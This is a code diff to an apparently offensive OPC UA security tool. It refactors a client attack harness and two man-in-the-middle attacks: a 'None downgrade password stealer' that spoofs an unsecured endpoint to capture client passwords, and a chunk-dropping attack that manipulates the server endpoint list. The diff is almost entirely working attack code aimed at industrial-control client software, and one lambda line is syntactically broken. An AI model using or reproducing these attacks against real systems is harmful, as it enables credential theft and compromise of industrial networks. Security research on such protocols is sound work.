@@ -1556,15 +1556,20 @@ def write_client_msg(sock : socket, msg : OpcMessage, final_chunk : bool=True):
 # A client attack is a coroutine that receives client connection sockets.
 ClientAttack = Generator[None, socket, None]
       
-# Sets up and executes an attack against an OPC client instead of a server. 
+# Sets up and executes an attack against (taking server endpoints as a parameter) an OPC client instead of a server. 
 # Also capable of forcing a client connection via ReverseHello, in which case the listen address is used as an 
 # endpointUri in the Reversehello message.
 def client_attack(
-    attacker : ClientAttack, 
+    attacker_factory : Callable[[List[endpointDescription.Type]], ClientAttack], 
+    server_url : str,
     listen_host : str, listen_port : int,
     revhello_addr  : Optional[Tuple[str, int]] = None,
     persist : bool = False
   ):
+    # First try connecting to the server.
+    server_eps = get_endpoints(server_url)
+    log(f'Got {len(server_eps)} server endpoints from {server_url}.')
+
     if revhello_addr is None:
       # Start listening for client connection.
       listener = create_server((listen_host, listen_port))
@@ -1587,6 +1592,7 @@ def client_attack(
         return clientsock
       
     firstround = True
+    attacker = attacker_factory(server_eps)
     while firstround or persist:
       try:
         while True:
@@ -1600,11 +1606,7 @@ def client_attack(
 
 
 # None downgrade password stealer.
-def nonegrade_mitm(server_url : str) -> ClientAttack:
-  # First try connecting to the server.
-  server_eps = get_endpoints(server_url)
-  log(f'Got {len(server_eps)} server endpoints from {server_url}.')
-  
+def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:  
   # Make a spoofed endpoint with None security that only accepts passwords. 
   # Base this on an existing endpoints, preferably those similar to what we want.
   spoofed_ep = max(server_eps, key=lambda ep: ep.securityPolicyUri == SecurityPolicy.NONE)
@@ -1745,7 +1747,7 @@ def nonegrade_mitm(server_url : str) -> ClientAttack:
 # password.
 # If tcp_resets is True intentional connection interruptions will be introduced to make a client accept gaps even when
 # it is strictly enforcing https://reference.opcfoundation.org/Core/Part6/v104/docs/6.7.2.4
-def chunkdrop_mitm(server_url : str, tcp_resets : bool) -> ClientAttack:
+def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : bool=False) -> ClientAttack:
   if tcp_resets:
     raise Exception('tcp_resets feature not yet implemented')
   
@@ -1870,19 +1872,13 @@ def chunkdrop_mitm(server_url : str, tcp_resets : bool) -> ClientAttack:
     drop_until_field('transportProfileUri')
     while not checkfield(StringField(), lambda: pu: pu.endswith('uatcp-uasc-uabinary')):
       drop_until_field('transportProfileUri')
-      
-    # Any security level will do.
-    checkfield('securityLevel')
     
-    # Finally, drop all remaining bytes.
-    dropbytes(len(ep_bytes) - cursor)
+    # Finally, drop all but the last byte, the securityLevel of the last endpoint in the list.
+    dropbytes(len(ep_bytes) - cursor - 1)
     return result
   
-  # Grab server endpoints list.
-  server_eps = get_endpoints(server_url)
-  log(f'Got {len(server_eps)} server endpoints from {server_url}. Testing if attack is applicable.')
-  
   # Test if rangedropping works on this endpoint list.
+  log(f'Testing if attack is applicable.')
   server_epbytes = ArrayField(endpointDescription).to_bytes(server_eps)
   dropranges = ranges_to_drop(server_epbytes)
   
@@ -1997,9 +1993,9 @@ def chunkdrop_mitm(server_url : str, tcp_resets : bool) -> ClientAttack:
               todo = respbytes
               for fieldName, fieldType in createSessionResponse.fields:
                 if fieldName == 'serverEndpoints':
-                  eplist_start = len(todo)
+                  eplist_start = len(respbytes) - len(todo)
                   _, todo = fieldType.from_bytes(todo)
-                  eplist_end = len(todo)
+                  eplist_end = len(respbytes) - len(todo)
                   break
                 else:
                   _, todo = fieldType.from_bytes(todo)
